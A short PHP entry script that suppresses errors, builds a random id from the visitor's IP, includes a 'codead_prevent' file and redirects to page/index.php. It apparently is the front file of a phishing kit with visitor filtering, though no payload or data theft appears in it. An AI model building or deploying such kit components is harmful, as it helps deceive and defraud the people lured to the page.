<?php
error_reporting(0);
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 20);

require (__DIR__ . '/codead_prevent/include.php');


header('Location: page/index.php');
?>